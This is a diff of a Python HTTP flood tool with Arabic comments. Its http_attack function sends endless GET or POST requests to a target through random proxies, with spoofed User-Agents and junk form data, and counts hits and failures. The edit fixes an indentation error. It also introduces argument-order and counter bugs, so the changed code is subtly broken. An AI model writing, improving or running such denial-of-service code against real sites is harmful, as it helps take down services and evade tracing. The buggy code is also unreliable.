@@ -30,31 +30,28 @@ ua = UserAgent()
 # توليد بيانات POST عشوائية
 def random_post_data(length=10):
     letters = string.ascii_letters + string.digits
-    return {f'param_{i}': ''.join(random.choice(letters) for _ in range(length)) for i in range(1, 4)}
+    return {f'param_{i}': ''.join(random.choice(letters) for i in range(length)) for i in range(1, 4)}
 
 # هجوم HTTP مع عداد للطلبات الناجحة والفاشلة
 async def http_attack(target, proxy=None, method="GET", headers=None, success_counter=None, failure_counter=None):
     async with aiohttp.ClientSession() as session:
-        headers = headers or {'User-Agent': ua.random}  # توليد User-Agent عشوائي
         while True:
+            headers = headers or {'User-Agent': ua.random}  # توليد User-Agent عشوائي
             try:
                 if method.upper() == "POST":
                     # توليد بيانات POST عشوائية
                     data = random_post_data()
                     async with session.post(target, headers=headers, proxy=proxy, data=data) as res:
                         print(f"{Fore.GREEN}Request sent (POST) | Status: {Fore.YELLOW}{res.status}{Style.RESET_ALL}")
-                        if success_counter is not None:
-                            success_counter[0] += 1  # زيادة العداد
+                        success_counter[0] += 1  # زيادة العداد
                 else:
                     async with session.get(target, headers=headers, proxy=proxy) as res:
                         print(f"{Fore.GREEN}Request sent (GET) | Status: {Fore.YELLOW}{res.status}{Style.RESET_ALL}")
-                        if success_counter is not None:
-                            success_counter[0] += 1  # زيادة العداد
+                        success_counter[0] += 1  # زيادة العداد
 
             except Exception as e:
-    print(f"{Fore.RED}[ ! ] An error occurred with proxy {proxy}: {str(e)}{Style.RESET_ALL}")
-                if failure_counter is not None:
-                    failure_counter[0] += 1  # زيادة العداد للفشل
+                print(f"{Fore.RED}[ ! ] An error occurred with proxy {proxy}: {str(e)}{Style.RESET_ALL}")
+                failure_counter[0] += 1  # زيادة العداد للفشل
             await asyncio.sleep(0.1)  # تأخير بين الطلبات لتقليل الضغط
 
 async def main(url, threads, proxies, method):
@@ -63,7 +60,7 @@ async def main(url, threads, proxies, method):
     tasks = []
     for _ in range(threads):
         proxy = random.choice(proxies)  # اختيار بروكسي عشوائي
-        tasks.append(asyncio.create_task(http_attack(url, proxy, method, None, success_counter, failure_counter)))
+        tasks.append(asyncio.create_task(http_attack(url, proxy, method, success_counter, failure_counter)))
     await asyncio.gather(*tasks)
 
     # تقرير نهائي
